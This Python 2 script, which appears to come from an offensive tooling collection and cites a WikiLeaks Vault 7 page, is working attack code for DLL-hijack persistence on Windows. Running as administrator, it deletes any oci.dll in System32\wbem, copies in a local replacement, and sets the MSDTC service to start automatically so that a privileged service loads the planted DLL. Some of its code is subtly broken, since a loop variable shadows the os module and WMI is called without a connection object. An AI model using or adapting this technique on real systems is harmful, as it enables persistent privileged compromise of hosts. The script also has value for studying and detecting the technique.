"""
https://wikileaks.org/ciav7p1/cms/page_2621767.html
Works from: Unknown
Fixed in: Unknown
"""
import os
import wmi
import shutil
import ctypes
from colorama import init, Fore
init(convert=True)

dll_name = "oci.dll"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)

def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	

def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def system_directory():
	for os in wmi.Win32_OperatingSystem():
		return os.SystemDirectory	
	
def oci_dll_hijack():
	print " {} oci_dll_hijack: Attempting to dll hijack msdtc service".format(infoBox())
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} oci_dll_hijack: We are running as admin, we can proceed".format(infoBox())

		if (os.path.isfile(os.path.join(system_directory(),"wbem",dll_name)) == True):
			try:
				os.remove(os.path.join(system_directory(),"wbem",dll_name))
				print " {} oci_dll_hijack: Successfully removed: {} to: {}".format(successBox(),dll_name,os.path.join(system_directory(),"wbem"))
			except Exception as error:
				print " {} oci_dll_hijack: Unable to remove: {} to: {}".format(errorBox(),dll_name,os.path.join(system_directory(),"wbem"))
				return False

		try:
			shutil.copy(dll_name,os.path.join(system_directory(),"wbem"))
			print " {} oci_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,os.path.join(system_directory(),"wbem"))
		except shutil.Error as error:
			print " {} oci_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False
		except IOError as error:
			print " {} oci_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False

		if (os.path.isfile(os.path.join(os.path.join(system_directory(),"wbem",dll_name))) == True):
			commands = ["sc qc msdtc",
						"sc config msdtc start=auto",
						"sc qc msdtc"]

			for command in commands:
				x = os.popen(command)
				if ("SUCCESS" in x.read()):
					print " {} oci_dll_hijack: Successfully ran SC command: {}".format(successBox(),command)
				else:
					print " {} oci_dll_hijack: Unable run SC command: {}".format(errorBox(),command)
					return False
	else:
		print " {} oci_dll_hijack: We are not admin, cannot proceed".format(errorBox())
		return False